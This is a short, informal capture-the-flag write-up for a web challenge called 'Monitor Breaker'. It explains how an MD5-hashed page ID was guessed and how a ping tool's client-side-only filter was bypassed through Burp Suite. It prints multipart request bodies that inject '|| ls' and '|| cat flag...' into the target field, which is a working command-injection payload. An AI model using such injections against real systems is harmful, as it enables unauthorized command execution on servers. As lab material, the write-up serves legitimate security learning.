---
title: Monitor Breaker
category: web
---

I love love love web challenges so this one was shrimple. Page not loading, then two that do. Decoding the URLs of the two pages that loaded using crackstation got me the MD5 of 1 and 2. soooooo the one next to it at the front must be 0 or 3, and 0 worked.

Now thinking back to my DVWA days, their command injections were also with pinging. Basically, it runs ping `<entry>` so you can just like && and then enter another command. However characters and letters aren't allowed. Butttt you can see that it only checks client side. Opening up burp suite community edition my beloved

here you can see these form sections:

```
------WebKitFormBoundaryJCBlD8DryegAQ4Cr
Content-Disposition: form-data; name="target"

1.1.1.1 
------WebKitFormBoundaryJCBlD8DryegAQ4Cr
Content-Disposition: form-data; name="command_type"

ping
```

sooooo what if we just... added on to the request with a few silly lil symbols!!

(update: i tried && for like 20 minutes before remembering that it only works when the previous command succeeds and ping fails lol)

so the updated request is

```
------WebKitFormBoundaryJCBlD8DryegAQ4Cr
Content-Disposition: form-data; name="target"

1.1.1.1 || ls
------WebKitFormBoundaryJCBlD8DryegAQ4Cr
Content-Disposition: form-data; name="command_type"

ping
```

then

```
------WebKitFormBoundaryJCBlD8DryegAQ4Cr
Content-Disposition: form-data; name="target"

1.1.1.1 || cat flag-9d444ad0f475b52e79a1713f25646dce.txt
------WebKitFormBoundaryJCBlD8DryegAQ4Cr
Content-Disposition: form-data; name="command_type"

ping
```

(i didnt get to SS this before instances went down)
